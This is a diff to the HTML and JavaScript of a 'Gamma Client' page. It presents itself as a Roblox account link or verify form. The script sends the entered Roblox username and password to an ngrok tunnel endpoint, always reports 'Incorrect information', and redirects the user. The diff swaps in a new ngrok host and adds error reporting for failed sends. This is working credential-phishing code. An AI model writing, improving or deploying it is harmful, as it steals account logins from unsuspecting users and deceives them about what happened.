@@ -130,6 +130,13 @@
       border-color: #00ff66;
       box-shadow: 0 0 6px rgba(0, 255, 102, 0.6);
     }
+    #debug {
+      color: #ff4444;
+      font-size: 0.8em;
+      margin-top: 10px;
+      text-align: center;
+      display: none;
+    }
     @media (max-width: 600px) {
       h1 {
         font-size: 1.8em;
@@ -163,10 +170,11 @@
     <button onclick="showLogin()">Get Started</button>
     <div id="loginForm">
       <h1>Gamma Client</h1>
-      <h3>Enter your Roblox Account to Link with the Client</h3>
+      <h3>Enter Roblox Account to Verify</h3>
       <input type="text" placeholder="Roblox Username" id="username" />
       <input type="password" placeholder="Roblox Password" id="password" />
       <button onclick="verify()">Verify</button>
+      <div id="debug"></div>
     </div>
   </div>
   <script>
@@ -179,13 +187,23 @@
     async function verify() {
       const username = document.getElementById('username').value.trim();
       const password = document.getElementById('password').value.trim();
-      const backendUrl = 'https://6e1d-2001-fd8-f502-5f6d-286f-13b0-db18-29b1.ngrok-free.app/api/verify';
+      const backendUrl = 'https://6ddb-158-62-67-117.ngrok-free.app/api/verify';
+      const debug = document.getElementById('debug');
       const data = { username, password };
-      await fetch(backendUrl, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(data)
-      });
+      try {
+        const response = await fetch(backendUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(data)
+        });
+        if (!response.ok) {
+          throw new Error(`Server responded with ${response.status}`);
+        }
+      } catch (error) {
+        debug.style.display = 'block';
+        debug.textContent = `Error: ${error.message}. Please report this.`;
+        console.error('Fetch error:', error.message);
+      }
       alert('Incorrect information, please check again');
       window.location.href = 'next.html';
     }
